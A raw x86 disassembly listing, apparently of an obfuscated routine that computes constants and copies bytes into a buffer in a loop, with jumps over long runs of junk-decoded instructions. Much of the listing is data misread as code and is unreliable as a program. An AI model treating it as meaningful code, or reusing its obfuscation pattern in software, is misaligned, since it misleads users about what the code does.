  40cb17:	(bad)  
  40cb18:	into   
  40cb19:	ins    BYTE PTR es:[edi],dx
  40cb1a:	jnp    0x40cab1
  40cb1c:	jb     0x40cb56
  40cb1e:	les    esp,FWORD PTR [edi-0x479e8b5d]
  40cb24:	dec    esp
  40cb25:	jle    0x40cb1b
  40cb27:	inc    ebx
  40cb28:	jbe    0x40cb61
  40cb2a:	jae    0x40cb1c
  40cb2c:	lods   eax,DWORD PTR ds:[esi]
  40cb2d:	mov    bh,0xe2
  40cb2f:	icebp  
  40cb30:	push   0x40
  40cb32:	mov    ah,0x8b
  40cb34:	ret    
  40cb35:	emms   
  40cb37:	mov    dl,0x43
  40cb39:	leave  
  40cb3a:	cmp    ch,BYTE PTR [edi]
  40cb3c:	pop    ebp
  40cb3d:	push   es
  40cb3e:	je     0x40cbab
  40cb40:	xor    eax,0xfdb853cb
  40cb45:	in     eax,dx
  40cb46:	in     eax,0x6c
  40cb48:	mov    dl,BYTE PTR [ebx]
  40cb4a:	xchg   esi,eax
  40cb4b:	mov    esi,DWORD PTR [edx-0x8]
  40cb4e:	out    dx,al
  40cb4f:	mov    edx,0xaa2864ba
  40cb54:	dec    esp
  40cb55:	xchg   ebp,eax
  40cb56:	mov    bh,0x4b
  40cb58:	fbstp  TBYTE PTR [edi-0xf496484]
  40cb5e:	int    0x4a
  40cb60:	mov    eax,0x24784ed1
  40cb65:	pop    esi
  40cb66:	loop   0x40cb27
  40cb68:	adc    al,0x6e
  40cb6a:	fistp  WORD PTR [ebx-0x4d]
  40cb6d:	cdq    
  40cb6e:	sti    
  40cb6f:	xlat   BYTE PTR ds:[ebx]
  40cb70:	push   ecx
  40cb71:	fwait
  40cb72:	pop    edi
  40cb73:	loop   0x40cb7d
  40cb75:	or     DWORD PTR [edi+0x33],0x1c
  40cb79:	pop    ebx
  40cb7a:	mov    al,ds:0xabf37f70
  40cb7f:	test   cl,ah
  40cb81:	in     eax,0xb3
  40cb83:	mov    ah,0x80
  40cb85:	je     0x40cbd0
  40cb87:	rcl    DWORD PTR [esi],cl
  40cb89:	sub    BYTE PTR [edi],ah
  40cb8b:	jmp    DWORD PTR [ebx]
  40cb8d:	push   0xffffffd3
  40cb8f:	jns    0x40cbee
  40cb91:	jg     0x40cbba
  40cb93:	dec    BYTE PTR [esi-0x34]
  40cb96:	repnz mov eax,0xd892605d
  40cb9c:	cld    
  40cb9d:	rcl    BYTE PTR [edi+0x72],cl
  40cba0:	shl    BYTE PTR [esi-0x13],1
  40cba3:	sbb    DWORD PTR [esi+0x5cfa9907],esp
  40cba9:	mov    ecx,fs
  40cbab:	out    dx,al
  40cbac:	rol    BYTE PTR [eax],1
  40cbae:	and    al,0x89
  40cbb0:	repnz inc ebp
  40cbb2:	stc    
  40cbb3:	sbb    al,BYTE PTR [ebp+0x46]
  40cbb6:	dec    esp
  40cbb7:	xchg   edi,eax
  40cbb8:	call   0x9e64922f
  40cbbd:	xchg   edx,eax
  40cbbe:	pop    esi
  40cbbf:	push   es
  40cbc0:	push   esi
  40cbc1:	cmp    BYTE PTR [ebx],0x3b
  40cbc4:	pop    edi
  40cbc5:	mov    al,ds:0xf8e0bead
  40cbca:	mov    WORD PTR [ebp+0x4e],gs
  40cbcd:	jle    0x40cb59
  40cbcf:	imul   ebp,DWORD PTR [esi],0x38
  40cbd2:	outs   dx,BYTE PTR ds:[esi]
  40cbd3:	push   esi
  40cbd4:	mov    dl,0x3a
  40cbd6:	loope  0x40cb8c
  40cbd8:	lods   eax,DWORD PTR ds:[esi]
  40cbd9:	pop    ecx
  40cbda:	imul   esp,edi,0xf35eedd
  40cbe0:	and    DWORD PTR [ecx],0x0
  40cbe3:	add    BYTE PTR [eax],al
  40cbe5:	mov    eax,DWORD PTR [ebp-0x18]
  40cbe8:	mov    edx,DWORD PTR [ebp-0x14]
  40cbeb:	shrd   eax,edx,0x2
  40cbef:	xor    eax,ecx
  40cbf1:	mov    ecx,DWORD PTR [ebp-0x18]
  40cbf4:	shr    edx,0x2
  40cbf7:	mov    edx,DWORD PTR [ebp-0x14]
  40cbfa:	xor    edx,edx
  40cbfc:	shl    ecx,0x1e
  40cbff:	or     eax,edx
  40cc01:	mov    ds:0x422660,eax
  40cc06:	pop    esi
  40cc07:	leave  
  40cc08:	ret    
  40cc09:	push   ebp
  40cc0a:	mov    ebp,esp
  40cc0c:	sub    esp,0x28
  40cc0f:	push   ebx
  40cc10:	push   esi
  40cc11:	push   edi
  40cc12:	mov    DWORD PTR [ebp-0x10],0x67e2
  40cc19:	mov    DWORD PTR [ebp-0x4],0x4726
  40cc20:	mov    DWORD PTR [ebp-0x8],0x580
  40cc27:	mov    DWORD PTR [ebp-0xc],0x5f3e
  40cc2e:	mov    DWORD PTR [ebp-0x28],0x3294
  40cc35:	mov    DWORD PTR [ebp-0x24],0x643
  40cc3c:	mov    DWORD PTR [ebp-0x20],0x2545
  40cc43:	mov    DWORD PTR [ebp-0x1c],0x43ab
  40cc4a:	xor    ebx,ebx
  40cc4c:	inc    ebx
  40cc4d:	mov    DWORD PTR [ebp-0x18],ebx
  40cc50:	mov    DWORD PTR [ebp-0x14],0x76b1
  40cc57:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc5a:	jmp    0x40cf1e
  40cc5f:	sub    edi,ebx
  40cc61:	sti    
  40cc62:	xchg   edi,eax
  40cc63:	sbb    dl,BYTE PTR [edi+0x7d189a1a]
  40cc69:	xor    DWORD PTR [eax+0x7e51912c],0x1818edb9
  40cc73:	rcl    BYTE PTR [eax+ebx*1],cl
  40cc76:	sbb    BYTE PTR [edi],ch
  40cc78:	(bad)  
  40cc79:	jmp    0xd1cc:0x415c80f7
  40cc80:	push   ebx
  40cc81:	je     0x40ccb0
  40cc83:	daa    
  40cc84:	push   ds
  40cc85:	lods   al,BYTE PTR ds:[esi]
  40cc86:	in     al,0x57
  40cc88:	add    al,BYTE PTR [ebx]
  40cc8a:	scas   eax,DWORD PTR es:[edi]
  40cc8b:	xor    bh,dh
  40cc8d:	xchg   esp,eax
  40cc8e:	in     eax,0x71
  40cc90:	shl    BYTE PTR [esi-0x10be3a95],0xbf
  40cc97:	aas    
  40cc98:	or     al,0xf1
  40cc9a:	sub    BYTE PTR [ebp-0x4e1652cd],dl
  40cca0:	mov    al,bl
  40cca2:	mov    al,0x8
  40cca4:	sub    BYTE PTR [edi+0x47d7bc4d],bh
  40ccaa:	jae    0x40cc46
  40ccac:	pop    ecx
  40ccad:	int    0x95
  40ccaf:	or     ch,ah
  40ccb1:	mov    edi,0x3ca84864
  40ccb6:	push   es
  40ccb7:	in     al,0x11
  40ccb9:	push   ss
  40ccba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccbb:	push   edx
  40ccbc:	jmp    0x6ca0366c
  40ccc1:	out    0x6a,al
  40ccc3:	div    DWORD PTR [eax]
  40ccc5:	clc    
  40ccc6:	add    cl,BYTE PTR [ebx]
  40ccc8:	or     edi,DWORD PTR [edx]
  40ccca:	loope  0x40cc8b
  40cccc:	in     al,0xa9
  40ccce:	mov    bl,0x48
  40ccd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccd1:	mov    ds:0x4397ed3b,eax
  40ccd6:	push   ss
  40ccd7:	loope  0x40cc6a
  40ccd9:	scas   eax,DWORD PTR es:[edi]
  40ccda:	clc    
  40ccdb:	loope  0x40ccf3
  40ccdd:	adc    DWORD PTR [edx-0x7f586439],edi
  40cce3:	jb     0x40cc9e
  40cce5:	add    al,0x22
  40cce7:	xor    BYTE PTR [esi+0x7054cbbd],ch
  40cced:	ins    BYTE PTR es:[edi],dx
  40ccee:	xor    DWORD PTR [edx-0x77],0xfa65df7e
  40ccf5:	pop    ds
  40ccf6:	rcl    BYTE PTR [ebp-0x7cc7c790],cl
  40ccfc:	leave  
  40ccfd:	leave  
  40ccfe:	test   DWORD PTR [edi-0x22],ebp
  40cd01:	test   DWORD PTR [ecx+0xc],esi
  40cd04:	fsubr  QWORD PTR [esi+0x3c]
  40cd07:	pop    esp
  40cd08:	sbb    DWORD PTR [edi+edi*8+0x3d796528],edi
  40cd0f:	out    0x5d,eax
  40cd11:	out    0x55,al
  40cd13:	(bad)  
  40cd14:	sti    
  40cd15:	retf   
  40cd16:	mov    dh,0xbb
  40cd18:	xchg   edi,eax
  40cd19:	mov    bl,BYTE PTR [eax+0x9]
  40cd1c:	sbb    DWORD PTR ds:0x25517c2d,eax
  40cd22:	and    DWORD PTR [esi+0x2e],esi
  40cd25:	pop    ds
  40cd26:	ja     0x40cd07
  40cd28:	inc    edi
  40cd29:	cld    
  40cd2a:	fld    TBYTE PTR [eax-0x3f]
  40cd2d:	test   al,0x9
  40cd30:	ror    DWORD PTR [ebx],0xa9
  40cd33:	inc    ebx
  40cd34:	mov    edx,DWORD PTR [esi+0x10]
  40cd37:	adc    bh,BYTE PTR [ecx+0x69]
  40cd3a:	mov    edx,0xd6bf7c26
  40cd3f:	call   0xd01f:0xe44d1fed
  40cd46:	jo     0x40ccf6
  40cd48:	addr16 jmp 0x5a88:0xe9e5bc36
  40cd50:	icebp  
  40cd51:	mov    bl,0x82
  40cd53:	int3   
  40cd54:	xor    esi,DWORD PTR [esi-0x2e]
  40cd57:	cld    
  40cd58:	(bad)  
  40cd59:	bound  eax,QWORD PTR [ebp+0x79]
  40cd5c:	mov    ch,0x98
  40cd5e:	xchg   ebp,eax
  40cd5f:	mov    WORD PTR [edx+0xa3c2527],?
  40cd65:	lods   eax,DWORD PTR ds:[esi]
  40cd66:	out    0x72,al
  40cd68:	jecxz  0x40cd0e
  40cd6a:	(bad)  
  40cd6b:	adc    al,0x47
  40cd6d:	dec    esp
  40cd6e:	push   0xaf6d314d
  40cd73:	mov    dl,BYTE PTR [esi+ecx*1+0x15d62b89]
  40cd7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd7b:	repz sub al,0xd3
  40cd7e:	sub    BYTE PTR ds:0x443f306e,ah
  40cd84:	inc    esi
  40cd85:	loop   0x40cdb0
  40cd87:	into   
  40cd88:	addr16 inc ecx
  40cd8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd8b:	cli    
  40cd8c:	xchg   ebx,eax
  40cd8d:	adc    ah,BYTE PTR ds:0x65b27676
  40cd93:	test   eax,0xd748ca56
  40cd98:	sub    BYTE PTR [edx+edi*8-0x6807b178],cl
  40cd9f:	dec    ebp
  40cda0:	and    BYTE PTR [ebx+edi*4+0x6032c11f],bl
  40cda7:	cmp    edi,DWORD PTR [ebp+ebx*1+0x29]
  40cdab:	pmaxub mm2,QWORD PTR [esi+0x5a]
  40cdaf:	push   cs
  40cdb0:	dec    ecx
  40cdb1:	mov    esi,0x7022248d
  40cdb6:	sub    DWORD PTR [edi-0x47],ecx
  40cdb9:	jle    0x40ce16
  40cdbb:	xor    ch,al
  40cdbd:	in     eax,dx
  40cdbe:	mov    esp,0x1ca88592
  40cdc3:	jmp    0xce5b4095
  40cdc8:	inc    esp
  40cdc9:	daa    
  40cdca:	aas    
  40cdcb:	inc    esi
  40cdcc:	in     al,0x5c
  40cdce:	sub    bl,BYTE PTR [edi+0x19]
  40cdd1:	aam    0x4a
  40cdd3:	in     al,dx
  40cdd4:	in     al,dx
  40cdd5:	inc    eax
  40cdd6:	jbe    0x40cd65
  40cdd8:	push   0xa9a2e0bb
  40cddd:	outs   dx,DWORD PTR ds:[esi]
  40cdde:	ret    0xba5e
  40cde1:	fdiv   st,st(2)
  40cde3:	movq   QWORD PTR [ebx-0x45],mm5
  40cde7:	daa    
  40cde8:	mov    WORD PTR [edi+0x38],fs
  40cdeb:	stos   DWORD PTR es:[edi],eax
  40cdec:	enter  0x86c,0x9a
  40cdf0:	fmul   DWORD PTR [ecx+ebx*8+0x65fbacce]
  40cdf7:	in     al,0x52
  40cdf9:	sub    edx,0xfffffff2
  40cdfc:	mov    ebx,0x8f0d0293
  40ce01:	jbe    0x40cdcb
  40ce03:	cdq    
  40ce04:	sub    ah,BYTE PTR [ebp-0x1373ec31]
  40ce0a:	mov    BYTE PTR [edx-0x22],dl
  40ce0d:	mov    edi,0x923f25ae
  40ce12:	dec    ebp
  40ce13:	fnstsw WORD PTR [eax+0x435102f6]
  40ce19:	ret    0x7ee2
  40ce1c:	mov    esp,0x38a22ead
  40ce21:	aas    
  40ce22:	or     esi,DWORD PTR [edx]
  40ce24:	cmp    DWORD PTR [ebp-0x17],esi
  40ce27:	adc    ecx,ecx
  40ce29:	mov    dl,0x32
  40ce2b:	xlat   BYTE PTR ds:[ebx]
  40ce2c:	mov    ss,WORD PTR [edi+0x9]
  40ce2f:	jmp    0x6c20:0xfa5759a5
  40ce36:	inc    ecx
  40ce37:	or     ah,BYTE PTR [eax]
  40ce39:	lea    ebp,[eax+0x7]
  40ce3c:	mov    al,BYTE PTR [edi+0x40]
  40ce3f:	jge    0x40cdc6
  40ce41:	add    BYTE PTR [esi],dl
  40ce43:	push   ebx
  40ce44:	inc    eax
  40ce45:	push   edx
  40ce46:	sub    eax,0x73c9a726
  40ce4b:	repz or ch,BYTE PTR [edi]
  40ce4e:	(bad)  
  40ce4f:	cmp    eax,DWORD PTR [eax+eiz*4]
  40ce52:	std    
  40ce53:	sbb    eax,0x8df605a0
  40ce58:	loop   0x40cec2
  40ce5a:	enter  0x816a,0x46
  40ce5e:	push   esp
  40ce5f:	cmp    BYTE PTR [edx-0x3],bh
  40ce62:	aad    0x71
  40ce64:	in     eax,0x97
  40ce66:	push   0xffffffd4
  40ce68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce69:	mov    eax,0x8cdd6310
  40ce6e:	mov    ebx,DWORD PTR [edx-0xbdcf667]
  40ce74:	mov    DWORD PTR [ecx+eiz*1],esp
  40ce77:	mov    al,ds:0x70f3aaab
  40ce7c:	jno    0x40cecc
  40ce7e:	inc    esi
  40ce7f:	add    ah,BYTE PTR [edi+0x7d]
  40ce82:	mov    bl,0x52
  40ce84:	fisttp WORD PTR [ecx+0x48993f75]
  40ce8a:	xchg   BYTE PTR [eax],dl
  40ce8c:	xchg   BYTE PTR [ecx+0x5d],bl
  40ce8f:	add    ebx,DWORD PTR [ecx]
  40ce91:	xchg   ecx,eax
  40ce92:	mov    ecx,DWORD PTR [edx]
  40ce94:	jmp    0x3a444878
  40ce99:	sub    BYTE PTR [esi],cl
  40ce9b:	loope  0x40ce77
  40ce9d:	or     al,bl
  40ce9f:	(bad)  
  40cea0:	ret    0xfb23
  40cea3:	out    dx,eax
  40cea4:	mov    dh,0x3a
  40cea6:	test   al,0x87
  40cea8:	add    dl,bh
  40ceaa:	push   edi
  40ceab:	add    bl,BYTE PTR [edi+0x1c784f53]
  40ceb1:	mov    ds:0xc1449e44,al
  40ceb6:	fwait
  40ceb7:	sahf   
  40ceb8:	loope  0x40cf03
  40ceba:	jne    0x40ceb2
  40cebc:	outs   dx,BYTE PTR ds:[esi]
  40cebd:	bound  esi,QWORD PTR [ebx+0x6a66b5]
  40cec3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cec4:	sbb    eax,DWORD PTR [ebx]
  40cec6:	and    edi,0x53ee788f
  40cecc:	or     BYTE PTR [ebx+edx*1],0x13
  40ced0:	jmp    0x922f0f9c
  40ced5:	(bad)  
  40ced6:	jle    0x40cefb
  40ced8:	in     al,0xb8
  40ceda:	es js  0x40cf17
  40cedd:	inc    ebp
  40cede:	aas    
  40cedf:	push   0xecbcc183
  40cee4:	sub    BYTE PTR [esi],0xf9
  40cee7:	mov    ah,al
  40cee9:	xor    DWORD PTR [eax],eax
  40ceeb:	xchg   edx,eax
  40ceec:	shl    BYTE PTR [ebx-0x3640fde1],0x54
  40cef3:	loope  0x40ce9e
  40cef5:	pushf  
  40cef6:	mov    bl,0xfd
  40cef8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cef9:	call   0x3b4d:0xc0c7c13e
  40cf00:	mov    al,ch
  40cf02:	mov    ebp,0xcd78335e
  40cf07:	outs   dx,BYTE PTR ds:[esi]
  40cf08:	(bad)  
  40cf0a:	loopne 0x40cf32
  40cf0c:	fild   DWORD PTR [eax]
  40cf0e:	xor    al,0x21
  40cf10:	lea    esi,[ebx+0x9]
  40cf13:	cmp    BYTE PTR [ebx-0xe],ch
  40cf16:	fld    QWORD PTR [esi]
  40cf18:	(bad)  
  40cf1a:	mov    BYTE PTR [esi+0x458bb51e],dl
  40cf20:	cld    
  40cf21:	sub    ecx,eax
  40cf23:	add    ecx,DWORD PTR [ebp-0xc]
  40cf26:	add    ecx,DWORD PTR [ebp-0x10]
  40cf29:	imul   ecx,ecx,0x1f80
  40cf2f:	add    ecx,0x727e
  40cf35:	xor    ecx,0x106c92f2
  40cf3b:	mov    DWORD PTR [ebp-0x8],0x113c
  40cf42:	mov    DWORD PTR [ebp-0xc],0x3d61
  40cf49:	mov    DWORD PTR [ebp-0x10],0x16e9
  40cf50:	mov    DWORD PTR [ebp-0x4],0x21aa
  40cf57:	mov    eax,DWORD PTR [ebp-0x10]
  40cf5a:	or     eax,0x3611
  40cf5f:	add    eax,DWORD PTR [ebp-0xc]
  40cf62:	mov    edx,DWORD PTR [ebp-0x8]
  40cf65:	and    eax,edx
  40cf67:	mov    edx,ecx
  40cf69:	sub    edx,eax
  40cf6b:	mov    eax,DWORD PTR [ebp-0x4]
  40cf6e:	mov    esi,DWORD PTR ds:0x422558
  40cf74:	mov    esi,DWORD PTR [esi+0x1cc]
  40cf7a:	add    eax,0x6772
  40cf7f:	or     eax,0x1f24
  40cf84:	sub    eax,0x7046
  40cf89:	xor    eax,0x497a
  40cf8e:	sub    esi,eax
  40cf90:	mov    eax,DWORD PTR [ebp+0x8]
  40cf93:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  40cf9a:	jmp    0x40d25e
  40cf9f:	nop
  40cfa0:	xchg   ebx,eax
  40cfa1:	retf   
  40cfa2:	ja     0x40cf6e
  40cfa4:	das    
  40cfa5:	sub    al,0x6a
  40cfa7:	sbb    DWORD PTR [esi+0x2b6bcd3],esi
  40cfad:	and    DWORD PTR [esi+0x72],edi
  40cfb0:	call   0x1512e7cd
  40cfb5:	sbb    BYTE PTR [eax],bl
  40cfb7:	inc    edi
  40cfb8:	mov    eax,0x950cf72c
  40cfbd:	xchg   ebx,eax
  40cfbe:	ret    
  40cfbf:	fisttp WORD PTR [edi]
  40cfc1:	push   esi
  40cfc2:	aam    0xe3
  40cfc4:	xor    BYTE PTR [edx+0x11],bl
  40cfc7:	into   
  40cfc8:	pop    ebp
  40cfc9:	adc    BYTE PTR [ebx-0x7fd00b06],dl
  40cfcf:	mov    eax,0x49ce2625
  40cfd4:	mov    dh,0xd
  40cfd6:	sbb    edx,DWORD PTR [eax+0x4bed66e]
  40cfdc:	mov    cl,0x21
  40cfde:	add    DWORD PTR ds:[ecx],esi
  40cfe1:	mov    ds,WORD PTR [ecx+0x60]
  40cfe4:	push   eax
  40cfe5:	mov    dh,0xe2
  40cfe7:	test   eax,0x75fac356
  40cfec:	je     0x40cff3
  40cfee:	inc    ebp
  40cfef:	aam    0x64
  40cff1:	int    0x9c
  40cff3:	dec    ebp
  40cff4:	fimul  DWORD PTR ds:0x6afcbe4f
  40cffa:	mov    bh,0x27
  40cffc:	ins    DWORD PTR es:[edi],dx
  40cffd:	mov    ecx,0xbfefdc9d
  40d002:	pushf  
  40d003:	adc    BYTE PTR [ecx+0x4],al
  40d006:	xchg   ebx,eax
  40d007:	mov    eax,0x47bdf4ba
  40d00c:	rcl    DWORD PTR [esi-0x74],0xe7
  40d010:	mov    esp,0xb8659d98
  40d015:	mov    DWORD PTR [esp],ecx
  40d018:	add    ah,ch
  40d01a:	fiadd  WORD PTR [eax+esi*1-0x7e0fd093]
  40d021:	jp     0x40d061
  40d023:	shl    ebx,cl
  40d025:	out    0xd2,eax
  40d027:	pusha  
  40d028:	fwait
  40d029:	aad    0xbd
  40d02b:	or     ch,dl
  40d02d:	push   ds
  40d02e:	outs   dx,DWORD PTR ds:[esi]
  40d02f:	adc    BYTE PTR ds:0x8bd8db55,dl
  40d035:	xlat   BYTE PTR ds:[ebx]
  40d036:	jg     0x40d030
  40d038:	pop    ebx
  40d039:	xor    al,BYTE PTR [ebp+0x1aad9660]
  40d03f:	push   ebp
  40d040:	dec    edx
  40d041:	cmp    eax,0x76d76eb5
  40d046:	dec    edx
  40d047:	rep lods al,BYTE PTR ds:[esi]
  40d049:	rcl    DWORD PTR [ebx+0x43770ac],0xbf
  40d050:	mov    WORD PTR ds:0x7c0bb32,?
  40d056:	adc    ebx,DWORD PTR [ebx]
  40d058:	shl    BYTE PTR [edx+0x22],1
  40d05b:	jecxz  0x40d041
  40d05d:	jmp    0x9245:0x4f231dd7
  40d064:	xchg   ebp,eax
  40d065:	sahf   
  40d066:	es push ebp
  40d068:	xchg   DWORD PTR [ecx+0x58248da3],esp
  40d06e:	jbe    0x40d06d
  40d070:	(bad)  
  40d071:	leave  
  40d072:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d073:	lds    edi,FWORD PTR [esi+0x5cf92402]
  40d079:	inc    esp
  40d07a:	push   ebp
  40d07b:	and    ah,0x5e
  40d07e:	jno    0x40d04d
  40d080:	rcl    BYTE PTR ss:[ecx-0x210fae99],0x97
  40d088:	sub    dl,bh
  40d08a:	fcmovnb st,st(2)
  40d08c:	dec    ebp
  40d08d:	sbb    al,0xd4
  40d08f:	fwait
  40d090:	pop    edx
  40d091:	cmp    eax,0x8ba57415
  40d096:	push   0xffffffca
  40d098:	in     eax,0x8b
  40d09a:	lds    edx,FWORD PTR [esi]
  40d09c:	(bad)  
  40d09d:	pop    ecx
  40d09e:	addr16 and edi,0xb
  40d0a2:	jmp    0xc409:0xd49fde00
  40d0a9:	(bad)  
  40d0aa:	mov    edi,0xf3f68cf0
  40d0af:	xor    al,0xcd
  40d0b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0b2:	mov    ebx,0x3c0dded4
  40d0b7:	xchg   ecx,eax
  40d0b8:	sub    edi,DWORD PTR [ebx-0x61a33eee]
  40d0be:	leave  
  40d0bf:	or     eax,0xfaf284ae
  40d0c4:	mov    eax,0xe63ff6a4
  40d0c9:	cwde   
  40d0ca:	fld1   
  40d0cc:	out    dx,eax
  40d0cd:	ss dec esi
  40d0cf:	cli    
  40d0d0:	lock rcl BYTE PTR [edi],0x40
  40d0d4:	mov    cl,0x84
  40d0d6:	mov    bl,0xf9
  40d0d8:	pop    ds
  40d0d9:	shr    cl,0xbf
  40d0dc:	add    dl,BYTE PTR [esi+0x28]
  40d0df:	jbe    0x40d0a4
  40d0e1:	pop    ecx
  40d0e2:	add    edi,edx
  40d0e4:	push   esi
  40d0e5:	cmp    cl,0x62
  40d0e8:	mov    ebx,0xdf8600b6
  40d0ed:	ss pop ebx
  40d0ef:	les    esi,FWORD PTR [ebx+eiz*1]
  40d0f2:	and    DWORD PTR [esi+0x299d8a46],ebx
  40d0f8:	push   ebp
  40d0f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0fa:	sub    al,0x21
  40d0fc:	jb     0x40d158
  40d0fe:	push   ebx
  40d0ff:	pop    esp
  40d100:	mov    ch,0xe7
  40d102:	or     edx,0xe1771063
  40d108:	test   eax,0x2608d925
  40d10d:	ds jbe 0x40d18f
  40d110:	or     bl,BYTE PTR [ebx]
  40d112:	icebp  
  40d113:	(bad)  
  40d114:	in     eax,dx
  40d115:	adc    BYTE PTR [edx],bl
  40d117:	inc    esp
  40d118:	dec    eax
  40d119:	cmp    eax,0x5a2b9bfc
  40d11e:	add    DWORD PTR [edx+0x18354442],ebp
  40d124:	mov    esi,0x55c8bbf6
  40d129:	bswap  ecx
  40d12b:	push   esp
  40d12c:	outs   dx,DWORD PTR ds:[esi]
  40d12d:	sub    bl,BYTE PTR [edx-0x38]
  40d130:	stos   BYTE PTR es:[edi],al
  40d131:	(bad)  
  40d132:	pop    esp
  40d133:	mov    WORD PTR [edx],fs
  40d135:	pushf  
  40d136:	jle    0x40d195
  40d138:	fs mov dh,0xe2
  40d13b:	adc    al,0xd8
  40d13d:	clc    
  40d13e:	sub    BYTE PTR [ecx+0x3cf2b2ed],dh
  40d144:	sbb    al,BYTE PTR [eax+0x46623c1c]
  40d14a:	adc    al,0x4f
  40d14c:	pop    edi
  40d14d:	fwait
  40d14e:	or     BYTE PTR [esi-0x15276c7e],al
  40d154:	(bad)  [esi+edx*2]
  40d157:	ficomp DWORD PTR [eax-0x66]
  40d15a:	pop    edi
  40d15b:	rol    BYTE PTR [eax-0xc],0x80
  40d15f:	mov    al,0xc5
  40d161:	loop   0x40d0f1
  40d163:	xchg   ecx,eax
  40d164:	jle    0x40d16a
  40d166:	mov    ds:0xcfc1de50,eax
  40d16b:	inc    edx
  40d16c:	test   BYTE PTR [esi-0x71],al
  40d16f:	and    al,0x44
  40d171:	dec    ebx
  40d172:	imul   esi,DWORD PTR [edi],0xffffff8a
  40d175:	jne    0x40d15b
  40d177:	pushf  
  40d178:	or     DWORD PTR [esi-0x5e1113c6],edi
  40d17e:	bound  ebx,QWORD PTR [ecx+esi*1-0x7e]
  40d182:	mov    dl,0x79
  40d184:	fbstp  TBYTE PTR [ebp-0x551e1367]
  40d18a:	sub    edi,DWORD PTR [edi]
  40d18c:	dec    eax
  40d18d:	push   eax
  40d18e:	cwde   
  40d18f:	aas    
  40d190:	loop   0x40d120
  40d192:	inc    esi
  40d193:	fadd   st,st(0)
  40d195:	rcl    dl,0xc7
  40d198:	jmp    0x40d161
  40d19a:	in     eax,0xe9
  40d19c:	test   cl,ah
  40d19e:	test   bh,ah
  40d1a0:	xor    al,0xf5
  40d1a2:	out    0xa9,al
  40d1a4:	ss popa 
  40d1a6:	cmc    
  40d1a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1a8:	int    0x31
  40d1aa:	jl     0x40d19e
  40d1ac:	sub    al,0x40
  40d1ae:	xor    dl,BYTE PTR [ebx]
  40d1b0:	xor    al,0xf0
  40d1b2:	in     al,0x43
  40d1b4:	pop    ebx
  40d1b5:	mov    bl,0x57
  40d1b7:	xchg   ebp,eax
  40d1b8:	push   eax
  40d1b9:	stc    
  40d1ba:	(bad)  
  40d1bb:	call   0x689f:0x68526eb7
  40d1c2:	aas    
  40d1c3:	xchg   esi,eax
  40d1c4:	loope  0x40d1f5
  40d1c6:	mov    ah,0x23
  40d1c8:	push   esp
  40d1c9:	icebp  
  40d1ca:	test   BYTE PTR [ecx+0x4c],cl
  40d1cd:	cli    
  40d1ce:	ins    BYTE PTR es:[edi],dx
  40d1cf:	pop    ecx
  40d1d0:	mov    ecx,0xf5e4fe2a
  40d1d5:	in     al,0xbc
  40d1d7:	mov    es,WORD PTR [eax+0x6dc5b9d6]
  40d1dd:	ins    DWORD PTR es:[edi],dx
  40d1de:	cmp    eax,0x13af4eb1
  40d1e3:	pop    es
  40d1e4:	ds out 0xc5,eax
  40d1e7:	in     eax,dx
  40d1e8:	mov    bh,0x17
  40d1ea:	xchg   edi,eax
  40d1eb:	jmp    0xd5f6:0x56cc5af9
  40d1f2:	(bad)  
  40d1f3:	call   0x183074da
  40d1f8:	inc    ecx
  40d1f9:	fdiv   st,st(6)
  40d1fb:	es mov al,0x47
  40d1fe:	adc    bl,ch
  40d200:	pusha  
  40d201:	cs inc ebp
  40d203:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d204:	jp     0x40d1d1
  40d206:	cmp    BYTE PTR [eax],cl
  40d208:	stos   BYTE PTR es:[edi],al
  40d209:	lea    eax,[edx+0x5b]
  40d20c:	inc    ebp
  40d20d:	cld    
  40d20e:	(bad)  
  40d20f:	xor    ah,BYTE PTR [edx]
  40d211:	ja     0x40d28b
  40d213:	pop    esp
  40d214:	mov    ebx,0x17dc9ee2
  40d219:	test   eax,0x7a14c53d
  40d21e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d21f:	(bad)  
  40d220:	mov    ds:0x89e5dd10,eax
  40d225:	adc    ch,BYTE PTR [ebx]
  40d227:	leave  
  40d228:	push   esp
  40d229:	jo     0x40d20b
  40d22b:	test   al,0xc4
  40d22d:	pusha  
  40d22e:	add    eax,0x9c4f2787
  40d233:	test   eax,0x1583d931
  40d238:	jle    0x40d244
  40d23a:	imul   esi,DWORD PTR [edx-0x5ecd289a],0x55c21e52
  40d244:	jl     0x40d1cf
  40d246:	sbb    eax,0x1d3e730b
  40d24b:	mov    ebp,0x4f52e9e4
  40d250:	mov    ch,bh
  40d252:	daa    
  40d253:	stos   BYTE PTR es:[edi],al
  40d254:	xor    eax,0x5e0abb16
  40d259:	xor    al,bh
  40d25b:	pop    ebp
  40d25c:	mov    ah,0x45
  40d25e:	mov    BYTE PTR [esi+ecx*1],al
  40d261:	mov    eax,DWORD PTR [ebp-0x14]
  40d264:	mov    esi,DWORD PTR [ebp-0x18]
  40d267:	and    eax,0x2389
  40d26c:	xor    eax,0x695
  40d271:	xor    edx,edx
  40d273:	div    esi
  40d275:	lea    ecx,[ecx+eax*1-0x2413]
  40d27c:	mov    eax,DWORD PTR [ebp-0x1c]
  40d27f:	add    eax,DWORD PTR [ebp-0x20]
  40d282:	mov    edx,DWORD PTR [ebp-0x24]
  40d285:	and    eax,edx
  40d287:	mov    edx,DWORD PTR [ebp-0x28]
  40d28a:	imul   eax,edx
  40d28d:	mov    edx,0xd0c8f
  40d292:	sub    edx,eax
  40d294:	cmp    ecx,edx
  40d296:	jbe    0x40cf3b
  40d29c:	push   0x2
  40d29e:	pop    eax
  40d29f:	mov    DWORD PTR [ebp-0x1c],eax
